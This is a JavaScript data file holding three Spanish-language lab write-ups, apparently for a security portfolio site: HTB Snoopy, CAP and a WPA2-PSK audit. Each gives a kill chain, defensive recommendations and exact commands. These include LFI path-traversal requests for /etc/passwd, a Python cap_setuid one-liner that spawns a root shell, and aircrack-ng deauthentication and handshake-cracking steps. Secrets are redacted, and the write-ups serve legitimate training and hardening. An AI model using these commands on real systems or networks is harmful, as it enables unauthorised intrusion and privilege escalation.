window.WRITEUPS = [
  {
    id: "snoopy",
    title: "Snoopy: LFI, credential exposure & Linux capabilities privesc",
    url: "writeup.html?id=snoopy",
    legacyUrl: "writeups/snoopy-lfi-capabilities.html",
    category: "Web Security",
    difficulty: "Medium",
    readTime: "8 min",
    date: "2026",
    visibility: "Public redacted",
    summary: "Cadena Linux desde LFI hasta root mediante exposición de credenciales y abuso de capabilities sobre Python.",
    tags: ["LFI", "Linux", "Capabilities", "Python", "SSH", "Privilege Escalation"],
    stack: ["Apache", "Linux", "Python", "getcap"],
    cover: "assets/imgs/cover-linux.svg",
    icon: "🕸️",
    featured: true,
    highlight: "Enumeración web, acceso inicial y escalada local en un mismo flujo técnico.",
    labName: "Snoopy",
    target: "Ubuntu web server",
    impact: "Full compromise",
    killChain: ["Reconnaissance", "LFI", "Credential exposure", "SSH access", "Linux capabilities privesc"],
    sections: {
      executiveSummary: "El laboratorio documenta una cadena de intrusión completa sobre un servidor Linux: reconocimiento de servicios, validación de Local File Inclusion, exposición de credenciales reutilizables, acceso SSH y escalada final mediante una capability insegura asignada a Python. La versión pública mantiene la trazabilidad técnica sin exponer flags, credenciales ni secretos.",
      scopeContext: "El alcance corresponde a un entorno de laboratorio controlado. El objetivo fue analizar la superficie expuesta, identificar vectores de acceso inicial y validar una ruta de privilege escalation local. Cualquier dato sensible queda saneado para publicación.",
      reconnaissanceEnumeration: [
        "Escaneo inicial de puertos y fingerprinting de servicios con Nmap.",
        "Enumeración web para localizar rutas, parámetros y posibles ficheros auxiliares.",
        "Validación de rutas internas y pruebas controladas de path traversal/LFI.",
        "Revisión de usuarios locales expuestos mediante lectura de ficheros del sistema."
      ],
      attackSurfaceAnalysis: "La superficie de ataque combina exposición HTTP con validación insuficiente de rutas. El fallo permite leer archivos locales y facilita el descubrimiento de información operativa. La cadena se agrava por credenciales expuestas y una configuración local peligrosa en Linux capabilities.",
      initialAccess: "El acceso inicial se obtiene tras correlacionar la lectura de ficheros locales con material sensible expuesto. Las credenciales recuperadas no se publican y se representan como password: ********. Con ellas se valida una sesión SSH como usuario no privilegiado.",
      privilegeEscalation: "La enumeración local identifica capabilities peligrosas. El intérprete Python dispone de cap_setuid, lo que permite cambiar el UID efectivo a 0 y abrir una shell privilegiada. La flag de root queda sustituida por HTB{REDACTED}.",
      recommendations: [
        "Implementar whitelist estricta de plantillas y bloquear rutas controladas por el usuario.",
        "Eliminar backups, configuraciones y secretos de directorios servidos por HTTP.",
        "Rotar credenciales expuestas y evitar reutilización entre servicios.",
        "Auditar Linux capabilities y retirar cap_setuid de intérpretes como Python, Perl o Ruby.",
        "Registrar accesos anómalos a ficheros sensibles como /etc/passwd, /etc/shadow o configuraciones internas."
      ],
      conclusion: "El caso demuestra cómo pequeños fallos acumulados pueden terminar en compromiso total. La lección principal es que la validación de entrada, la gestión de secretos y el hardening local deben tratarse como controles conectados, no como medidas aisladas."
    },
    commands: [
      "nmap -sC -sV -p- <target>",
      "curl \"http://<target>/index.php?page=../../../../../../etc/passwd\"",
      "curl \"http://<target>/index.php?page=../../../../../../etc/os-release\"",
      "ssh <user>@<target> # password: ********",
      "getcap -r / 2>/dev/null",
      "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
    ],
    evidence: [
      {
        title: "Service fingerprinting",
        phase: "Reconnaissance & Enumeration",
        description: "Evidencia técnica esperada: salida de Nmap con servicios expuestos. Not documented in the available evidence.",
        type: "command",
        command: "nmap -sC -sV -p- <target>",
        redacted: true
      },
      {
        title: "Local File Inclusion validation",
        phase: "Initial Access",
        description: "Lectura controlada de ficheros locales para confirmar LFI sin exponer contenido sensible.",
        type: "command",
        command: "curl \"http://<target>/index.php?page=../../../../../../etc/passwd\"",
        redacted: true
      },
      {
        title: "Linux capability abuse",
        phase: "Privilege Escalation",
        description: "Uso de cap_setuid sobre Python para elevar privilegios tras enumeración local.",
        type: "command",
        command: "getcap -r / 2>/dev/null\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        redacted: true
      }
    ]
  },
  {
    id: "cap",
    title: "CAP: insecure packet capture exposure, FTP credential reuse and cap_setuid privesc",
    url: "writeup.html?id=cap",
    legacyUrl: "writeups/cap-pcap-ftp-capabilities.html",
    category: "Web Security",
    difficulty: "Easy",
    readTime: "8 min",
    date: "2026",
    visibility: "Public redacted",
    summary: "Exposición de capturas históricas, recuperación de credenciales FTP y escalada Linux mediante cap_setuid.",
    tags: ["PCAP", "FTP", "Wireshark", "Linux", "Capabilities", "Credential Reuse"],
    stack: ["Gunicorn", "FTP", "Python", "Wireshark"],
    cover: "assets/imgs/cover-cap.svg",
    icon: "🧢",
    featured: true,
    highlight: "Análisis de tráfico, reutilización de credenciales y privilege escalation.",
    labName: "CAP",
    target: "Linux web application",
    impact: "User compromise + root escalation",
    killChain: ["Web enumeration", "PCAP disclosure", "Credential recovery", "SSH access", "cap_setuid privesc"],
    sections: {
      executiveSummary: "El laboratorio muestra el impacto de publicar capturas de red accesibles desde una aplicación web. El análisis del PCAP permite recuperar credenciales reutilizables, obtener acceso interactivo y elevar privilegios mediante cap_setuid en Python.",
      scopeContext: "Entorno de laboratorio centrado en exposición de evidencias de red y malas prácticas de reutilización de credenciales. La publicación omite contraseñas, flags y valores sensibles.",
      reconnaissanceEnumeration: [
        "Identificación de aplicación web y endpoints asociados a capturas de seguridad.",
        "Descarga y análisis de capturas históricas.",
        "Filtrado de protocolos de aplicación en Wireshark para localizar datos sensibles.",
        "Comprobación de reutilización de credenciales en servicios interactivos."
      ],
      attackSurfaceAnalysis: "La debilidad principal es la exposición de PCAPs con tráfico sensible. Cuando una captura contiene credenciales en protocolos sin cifrar, el riesgo se traslada de disclosure a acceso real. La mala configuración de capabilities completa la cadena hacia root.",
      initialAccess: "La captura contiene credenciales recuperables. Tras sanearlas como password: ********, se valida acceso con un usuario legítimo. No se publican valores reales.",
      privilegeEscalation: "La enumeración local detecta Python con cap_setuid. Esta capability permite obtener shell privilegiada con UID 0 en el contexto del laboratorio.",
      recommendations: [
        "No publicar PCAPs ni snapshots técnicos sin saneado previo.",
        "Evitar protocolos que transmitan credenciales en claro.",
        "Aplicar control de acceso estricto sobre endpoints de diagnósticos y capturas.",
        "Rotar cualquier credencial que haya atravesado tráfico capturado.",
        "Eliminar capabilities peligrosas de intérpretes y binarios no imprescindibles."
      ],
      conclusion: "El caso evidencia que los artefactos de diagnóstico también forman parte de la superficie de ataque. Una captura aparentemente operativa puede convertirse en credenciales, acceso y escalada."
    },
    commands: [
      "nmap -sC -sV -p- <target>",
      "curl -O http://<target>/data/0",
      "wireshark <capture>.pcap",
      "ssh <user>@<target> # password: ********",
      "getcap -r / 2>/dev/null",
      "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
    ],
    evidence: [
      {
        title: "PCAP exposure",
        phase: "Reconnaissance & Enumeration",
        description: "Descubrimiento de capturas accesibles desde la aplicación. Not documented in the available evidence.",
        type: "command",
        command: "curl -O http://<target>/data/<id>",
        redacted: true
      },
      {
        title: "Credential recovery from traffic",
        phase: "Initial Access",
        description: "Análisis de protocolo de aplicación con credenciales saneadas antes de publicación.",
        type: "command",
        command: "wireshark <capture>.pcap # credentials redacted",
        redacted: true
      },
      {
        title: "cap_setuid privilege escalation",
        phase: "Privilege Escalation",
        description: "Escalada local mediante capability peligrosa sobre Python.",
        type: "command",
        command: "getcap -r / 2>/dev/null\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        redacted: true
      }
    ]
  },
  {
    id: "wpa2-handshake",
    title: "WPA2-PSK audit: handshake capture, cracking and traffic decryption",
    url: "writeup.html?id=wpa2-handshake",
    legacyUrl: "writeups/wpa2-handshake-cracking.html",
    category: "Wireless",
    difficulty: "Medium",
    readTime: "9 min",
    date: "2026",
    visibility: "Public redacted",
    summary: "Auditoría WiFi completa con captura de handshake, cracking y análisis de tráfico descifrado.",
    tags: ["WPA2", "Handshake", "Wireless", "Wireshark", "Aircrack-ng", "Deauth"],
    stack: ["airodump-ng", "aireplay-ng", "aircrack-ng", "Wireshark"],
    cover: "assets/imgs/cover-wireless.svg",
    icon: "📡",
    featured: true,
    highlight: "Cobertura completa de auditoría inalámbrica ofensiva y análisis de paquetes.",
    labName: "WPA2-PSK audit",
    target: "Wireless lab network",
    impact: "PSK recovery in controlled conditions",
    killChain: ["Monitor mode", "Handshake capture", "Controlled deauth", "Offline cracking", "Traffic decryption"],
    sections: {
      executiveSummary: "El laboratorio documenta una auditoría WPA2-PSK en entorno controlado: preparación de interfaz, captura de handshake, deautenticación controlada, cracking offline y análisis de tráfico descifrado.",
      scopeContext: "Prueba realizada exclusivamente sobre una red de laboratorio autorizada. Se ocultan SSID sensibles, BSSID completos, claves y cualquier material reutilizable.",
      reconnaissanceEnumeration: [
        "Identificación de interfaces inalámbricas disponibles.",
        "Activación de modo monitor.",
        "Enumeración de redes, canales y clientes asociados.",
        "Captura de handshake WPA2-PSK."
      ],
      attackSurfaceAnalysis: "El vector depende de la robustez de la PSK y de la disponibilidad de clientes para forzar o esperar un nuevo handshake. El cracking es offline, por lo que la mitigación principal es una clave fuerte y políticas de rotación adecuadas.",
      initialAccess: "No aplica acceso interactivo a host. El resultado técnico es la recuperación controlada de la PSK en laboratorio y la posibilidad de descifrar tráfico capturado.",
      privilegeEscalation: "Not documented in the available evidence.",
      recommendations: [
        "Usar WPA2/WPA3 con contraseñas largas, aleatorias y no basadas en diccionario.",
        "Deshabilitar WPS si no es estrictamente necesario.",
        "Monitorizar deautenticaciones anómalas y cambios bruscos de asociación.",
        "Segmentar clientes inalámbricos y aplicar aislamiento cuando corresponda.",
        "Rotar PSK tras sospechas de exposición o auditorías fallidas."
      ],
      conclusion: "El caso muestra la diferencia entre capturar un handshake y comprometer realmente una red: la seguridad práctica depende sobre todo de la entropía de la PSK y de la monitorización del entorno inalámbrico."
    },
    commands: [
      "airmon-ng start wlan0",
      "airodump-ng wlan0mon",
      "airodump-ng -c <channel> --bssid <BSSID_REDACTED> -w capture wlan0mon",
      "aireplay-ng -0 5 -a <BSSID_REDACTED> wlan0mon",
      "aircrack-ng capture-01.cap -w <wordlist>",
      "wireshark capture-01.cap"
    ],
    evidence: [
      {
        title: "Wireless reconnaissance",
        phase: "Reconnaissance & Enumeration",
        description: "Identificación de canal, BSSID saneado y clientes en laboratorio.",
        type: "command",
        command: "airodump-ng wlan0mon",
        redacted: true
      },
      {
        title: "Handshake capture",
        phase: "Initial Access",
        description: "Captura de handshake WPA2-PSK sin publicar BSSID completo ni clave.",
        type: "command",
        command: "airodump-ng -c <channel> --bssid <BSSID_REDACTED> -w capture wlan0mon",
        redacted: true
      },
      {
        title: "Offline cracking and traffic analysis",
        phase: "Technical Evidence",
        description: "Cracking offline y análisis posterior en Wireshark con PSK saneada.",
        type: "command",
        command: "aircrack-ng capture-01.cap -w <wordlist>\nwireshark capture-01.cap",
        redacted: true
      }
    ]
  }
];